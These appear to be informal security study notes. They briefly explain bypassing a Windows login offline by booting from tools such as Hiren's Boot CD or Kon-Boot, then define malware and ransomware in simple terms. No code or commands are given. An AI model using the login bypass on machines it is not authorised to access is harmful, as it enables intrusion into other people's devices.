Offline Bypass
--------------
When the user is in shut down mode. When you dont have the access of the GUI of the machine/windows. Then we will use third party software like hiren boot cd, kon boot cd etc etc. 
We will create a bootable media ---> CD, pen drive, and enter the BIOS of the machine and boot from the bootable media.

MALWARE == MAL + WARE
MALicious + softWARE

Malwares are the piece of codes, tools, applications and softwares which can harm your device. User do not have any clue about the malware and the harm which is done to the user is unknown.

1. Ransomeware

and many more....

1. Ransomeware
--------------
	They are just like someone kidnapped your child and asking for some money as the form of ramsome. They highjack your device (database, server, desktop, laptop, etc etc) and they encrypt the data which is there in the device. Attacker asks for the money and if you do not pay them the money they are not going to release/decrypt the data of your device. At the same time, they download the original documents from your device and leak the data.
